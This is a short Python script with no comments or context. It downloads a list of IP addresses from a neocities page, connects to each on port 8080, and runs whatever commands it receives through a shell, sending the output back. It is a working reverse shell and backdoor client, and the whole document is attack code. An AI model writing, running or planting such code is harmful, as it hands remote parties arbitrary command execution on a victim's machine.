import socket
import subprocess
import requests

def connect(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 8080))
    while True:
        command = s.recv(1024)
        try:
            output = subprocess.check_output(command, shell=True)
            s.send(output)
        except:
            s.send("Error executing command.\n")
    s.close()

url = "https://thekoolestklub.neocities.org/randomstrings"
response = requests.get(url)
ip_list = response.text.split("\n")
for ip in ip_list:
    connect(ip)